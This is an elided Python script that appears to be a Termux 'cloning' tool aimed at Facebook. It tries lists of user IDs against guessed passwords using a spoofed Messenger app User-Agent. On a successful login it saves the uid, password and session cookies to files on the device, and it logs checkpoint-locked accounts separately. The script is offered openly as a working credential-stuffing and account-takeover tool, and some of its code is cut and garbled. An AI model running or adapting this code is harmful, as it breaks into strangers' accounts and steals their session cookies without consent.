#SC MAKE BY KRISHNA 
#WORKING SCRIPT 
#Decode Done By Error x Ethan Enjoy.
...
| $$\  $$ | $$  \ $$  | $$   /$$  \ $$| $$  | $$| $$\  $$$| $$  | $$      
| $$ \  $$| $$  | $$ /$$$$$$|  $$$$$$/| $$  | $$| $$ \  $$| $$  | $$      
|__/  \__/|__/  |__/|______/ \______/ |__/  |__/|__/  \__/|__/  |__/      
                                                                          
                                                                          
                                                                          
                \/____/                  \/____/                  \/____/                  \/____/                  \/____/ V/1.3
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;91m[\033[1;35m≋\033[1;91m] \033[1;92mDEVELOPER \033[1;91m :   \033[1;92mKRISHNA _ON_FIRE
\033[1;91m[\033[1;35m≋\033[1;91m] \033[1;92mFACEBOOK \033[1;91m  :   \033[1;92mMR-KRISHNA KRISHNA -404
\033[1;91m[\033[1;35m≋\033[1;91m] \033[1;92mTOOL TYPE \033[1;91m :   \033[1;92mRANDOM/FILE
\033[1;91m[\033[1;35m≋\033[1;91m] \033[1;92mVERSION \033[1;91m   :   \033[1;92m.0
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""") 
...
def menu():
    ...
    if sex in ['1']:
        ...
        os.system('https://www.facebook.com/profile.php?id=61572436693142https://www.facebook.com/profile.php?id=61572436693142/NOT.FOUND.THIS.LINK');menu()
    elif sex in ['0']:
        sys.exit()
    else:
        menu()
...
def file():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A} KRISHNA.txt');linex()
...
def randm(ids,psd):
    ...
    sys.stdout.write(f'\r\r{A}[{G1} KRISHNA-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        for pas in psd:
            ...
            head={'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 8.1.0;CPH1803 Build/OPM1.171019.026)[FBAN/Orca- Android;FBAV/275.0.0.20.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/234764319;FBCR/TNT;FBMF/OPPO;FBDV/CPH1803;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1',
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                	print(f'\r\r{A}[{G1} KRISHNA-OK{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/AKASH-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{A}[{S} KRISHNA-LK{A}]{S} {uid} {A}|{S} {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
    ...
    try:
        ...
        'X-FB-Server-Cluster':'True',
            ...
            if 'access_token' in po:
                print(f'\r\r{A}[{G1} KRISHNA-OK{A}]{G1} {ids} {A}|{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/KRISHNA-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                #print(f'\r\r{A}[{M}KRISHNA-CP{A}]{M} {ids} {A}|{M} {pas}')
                open('/sdcard/KRISHNA-FILE-CPtxt','a').write(ids+'|'+pas+'\n')
            else:continue
        loop+=1
    except Exception as e:
        pass
